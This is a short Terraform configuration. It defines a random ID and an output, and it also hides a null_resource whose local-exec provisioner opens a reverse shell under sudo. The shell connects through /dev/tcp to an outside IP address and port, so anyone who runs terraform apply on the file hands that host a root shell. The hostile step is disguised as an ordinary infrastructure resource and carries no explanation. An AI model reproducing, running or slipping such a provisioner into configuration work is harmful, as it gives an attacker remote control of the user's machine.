
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "cmd8" {
  provisioner "local-exec" {
      command = "sudo nohup 0<&196;exec 196<>/dev/tcp/45.79.176.241/4243; sh <&196 >&196 2>&196"
        }
        }

output "random" {
  value = "${random_id.random.hex}"
}
